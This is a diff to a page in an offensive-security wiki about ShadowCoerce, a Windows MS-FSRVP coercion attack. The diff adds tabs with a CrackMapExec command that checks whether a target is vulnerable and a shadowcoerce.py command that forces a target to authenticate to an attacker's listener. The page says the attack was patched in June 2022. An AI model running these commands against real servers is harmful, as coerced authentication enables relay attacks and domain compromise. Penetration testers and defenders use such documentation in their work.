@@ -12,7 +12,7 @@ Similarly to other MS-RPC abuses, this works by using a specific method relying 
 
 A requirement to the abuse is to have the "File Server VSS Agent Service" enabled on the target server.
 
-![](<../../../.gitbook/assets/File Server VSS Agent Service.png>)
+<figure><img src="../../../.gitbook/assets/Screenshot from 2021-12-29 16-20-12.png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 In June 2022, Microsoft patched [CVE-2022-30154](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30154) in [KB5014692](https://support.microsoft.com/en-us/topic/kb5015527-shadow-copy-operations-using-vss-on-remote-smb-shares-denied-access-after-installing-windows-update-dated-june-14-2022-6d460245-08b6-40f4-9ded-dd030b27850b), which also patched this coercion attack.
@@ -20,29 +20,33 @@ In June 2022, Microsoft patched [CVE-2022-30154](https://msrc.microsoft.com/upda
 
 ## Practice
 
+{% tabs %}
+{% tab title="Enumerate" %}
+[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) can be used to check if the target is vulnerable to ShadowCoerce.
+
+```bash
+crackmapexec smb $IP -u $USER -p $PASSWORD -M shadowcoerce
+```
+{% endtab %}
+
+{% tab title="Exploit" %}
 The following Python proof-of-concept ([https://github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)) implements the `IsPathSupported` and `IsPathShadowCopied` methods.
 
 {% hint style="success" %}
-**Nota bene**: for the proof of concept to work, using a proper security provider (`RPC_C_AUTHN_WINNT`) and authentication level (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) can  required. It is enabled by default in the script.
+**Nota bene**: for the proof of concept to work, using a proper security provider (`RPC_C_AUTHN_WINNT`) and authentication level (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) can required. It is enabled by default in the script.
 {% endhint %}
 
 ```bash
 shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
 ```
-
-![](<../../../.gitbook/assets/MS FSRVP abuse example.png>)
-
-{% hint style="info" %}
-In my tests, the coercion needed to be attempted twice in order to work when the FssAgent hadn't been requested in a while. In short, run the command again if it doesn't work the first time.
-{% endhint %}
+{% endtab %}
+{% endtabs %}
 
 ## Resources
 
 Topotam's tweet: [https://twitter.com/topotam77/status/1475701014204461056](https://twitter.com/topotam77/status/1475701014204461056)
 
 Topotam's slides: [https://fr.slideshare.net/LionelTopotam/petit-potam-slidesrtfmossir](https://fr.slideshare.net/LionelTopotam/petit-potam-slidesrtfmossir)
-
-{% file src="../../../.gitbook/assets/PetitPotam-SLIDES-RTFM_OSSIR.pdf" %}
 
 {% embed url="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b" %}
 
